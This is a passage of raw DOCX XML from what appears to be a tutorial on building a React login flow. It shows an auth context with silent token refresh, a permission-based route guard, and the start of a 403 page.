              <w:left w:val="single" w:sz="24" w:color="4F5DFF"/>
              <w:top w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:bottom w:val="single" w:sz="4" w:color="D1D5DB"/>
              <w:right w:val="single" w:sz="4" w:color="D1D5DB"/>
            </w:tcBorders>
          </w:tcPr>
          <w:p>
            <w:pPr>
              <w:spacing w:before="80"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="4F5DFF"/>
                <w:sz w:val="18"/>
              </w:rPr>
              <w:t xml:space="preserve">INFO  ·  </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="21"/>
              </w:rPr>
              <w:t>Why refresh COALESCING matters</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>When the access token expires, many in-flight requests can 401 simultaneously (dashboard fires N widgets in parallel).</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>Without coalescing each 401 triggers its own /auth/refresh — N concurrent refreshes; N-1 fail with 'token already rotated'; the dashboard explodes.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40" w:line="288" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:color w:val="2F3545"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>With coalescing the FIRST 401 fires one refresh; every other concurrent 401 awaits the same promise and reuses the resulting token. Net: smooth UX on every token-expiry boundary.</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:after="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>8.5  lib/auth-context.jsx — React Context for the Session</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Holds the React-visible half of auth state: `user`, `loading`. Exposes `login`, `logout`, `hasPermission`, `hasAny`. On mount it fires a single silent /auth/refresh; success → hydrate, failure → stay anonymous; always setLoading(false) in finally.</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src/lib/auth-context.jsx</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { createContext, useCallback, useContext, useEffect, useMemo, useState } from 'react';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { api, setAccessToken, setCsrfToken, clearAuthTokens } from './api-client.js';</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const AuthContext = createContext(null);</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export function AuthProvider({ children }) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const [user, setUser]       = useState(null);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const [loading, setLoading] = useState(true);</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 Mount-time silent refresh</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  useEffect(() =&gt; {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    let cancelled = false;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    api.post('/auth/refresh')</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      .then(r =&gt; {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        if (cancelled) return;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        setAccessToken(r.data.data.accessToken);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        setCsrfToken(r.data.data.csrfToken);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        setUser(r.data.data.user);</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.catch(() =&gt; {/* anonymous; that's fine */})</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      .finally(() =&gt; { if (!cancelled) setLoading(false); });</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return () =&gt; { cancelled = true; };</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  }, []);</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const login = useCallback(async (employeeId, password) =&gt; {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    const r = await api.post('/auth/login', { employee_id: employeeId, password });</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    setAccessToken(r.data.data.accessToken);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    setCsrfToken(r.data.data.csrfToken);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    setUser(r.data.data.user);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  }, []);</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const logout = useCallback(async () =&gt; {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    try { await api.post('/auth/logout'); } catch {}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    clearAuthTokens();</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    setUser(null);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  }, []);</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const hasPermission = useCallback(</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    code =&gt; (user ? user.permissions.includes(code) : false), [user]);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const hasAny = useCallback((...codes) =&gt; {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    if (!user) return false;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    const owned = new Set(user.permissions);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return codes.some(c =&gt; owned.has(c));</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  }, [user]);</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const value = useMemo(</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    () =&gt; ({ user, loading, login, logout, hasPermission, hasAny }),</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    [user, loading, login, logout, hasPermission, hasAny],</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return &lt;AuthContext.Provider value={value}&gt;{children}&lt;/AuthContext.Provider&gt;;</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export function useAuth() {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const ctx = useContext(AuthContext);</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  if (!ctx) throw new Error('useAuth() must be used inside &lt;AuthProvider&gt;.');</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  return ctx;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:r>
        <w:br w:type="page"/>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="480" w:after="200"/>
        <w:pBdr>
          <w:bottom w:val="single" w:sz="12" w:space="4" w:color="4F5DFF"/>
        </w:pBdr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="4F5DFF"/>
          <w:sz w:val="48"/>
        </w:rPr>
        <w:t>Part IX  ·  STEP 8  ·  Login + ProtectedRoute + Dashboard Shell</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i/>
          <w:color w:val="4B5563"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>The user-visible payoff. Login page matching the reference mockup, route guard for every protected URL, sidebar that filters itself based on permissions, top bar with auto-derived title + role badge + initials, dashboard shell with stat cards + permission inspector, and the final App.jsx route tree.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>9.1  ProtectedRoute.jsx — The Route Guard</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="40" w:after="80" w:line="300" w:lineRule="auto"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="21"/>
        </w:rPr>
        <w:t>Four possible outcomes per render: loading → spinner; anonymous → Navigate to /login with state.from for bounce-back; authenticated but missing permission → render &lt;Forbidden&gt;; otherwise → render children.</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src/components/ProtectedRoute.jsx</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { Navigate, useLocation } from 'react-router-dom';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { useAuth } from '../lib/auth-context.jsx';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { Spinner } from './ui/Spinner.jsx';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { Forbidden } from '../pages/Forbidden.jsx';</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export function ProtectedRoute({ children, requiredPermission }) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const { user, loading, hasPermission } = useAuth();</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const location = useLocation();</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if (loading) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return (</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;div className="min-h-screen flex items-center justify-center"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">        &lt;Spinner size={28} className="text-ink-soft" /&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;/div&gt;);</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if (!user) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return &lt;Navigate to="/login" replace state={{ from: location }} /&gt;;</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if (requiredPermission &amp;&amp; !hasPermission(requiredPermission)) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    return &lt;Forbidden requiredPermission={requiredPermission} /&gt;;</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return children;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>}</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="40"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p/>
    <w:p>
      <w:pPr>
        <w:spacing w:before="320" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Calibri" w:hAnsi="Calibri"/>
          <w:b/>
          <w:color w:val="2F3545"/>
          <w:sz w:val="32"/>
        </w:rPr>
        <w:t>9.2  Forbidden.jsx — 403 Page</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src/pages/Forbidden.jsx</w:t>
              <w:br/>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { Link } from 'react-router-dom';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { ShieldOff } from 'lucide-react';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { Button } from '../components/ui/Button.jsx';</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t>import { useAuth } from '../lib/auth-context.jsx';</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export function Forbidden({ requiredPermission }) {</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  const { user, logout } = useAuth();</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">  return (</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">    &lt;main className="min-h-screen flex items-center justify-center p-8 bg-base"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:color w:val="2F3545"/>
                <w:sz w:val="17"/>
              </w:rPr>
              <w:t xml:space="preserve">      &lt;div className="w-full max-w-md bg-white rounded-lg border border-border shadow-card p-8 text-center"&gt;</w:t>
            </w:r>
          </w:p>
          <w:p>
            <w:pPr>
              <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
